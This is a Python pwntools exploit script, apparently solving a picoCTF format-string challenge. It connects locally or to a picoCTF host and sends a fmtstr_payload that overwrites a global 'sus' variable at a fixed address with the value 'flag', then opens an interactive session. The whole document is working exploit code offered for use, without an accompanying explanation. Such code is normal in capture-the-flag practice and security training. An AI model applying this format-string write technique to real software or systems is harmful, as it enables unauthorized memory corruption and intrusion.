#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'info'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './vuln'  # Replace with actual binary name
HOST = 'rhea.picoctf.net'  # Replace with actual host
PORT = 55816  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    #objdump -t ./vuln | grep sus
    sus_addr = 0x00404060
    target_val = 0x67616c66
    # %p shows up at 14
    offset = 14

    addresses = {sus_addr : target_val}

    conn.recvuntil(b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n")
    
    payload = fmtstr_payload(offset, addresses, write_size="byte")
    conn.sendline(payload)

    conn.interactive()


    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()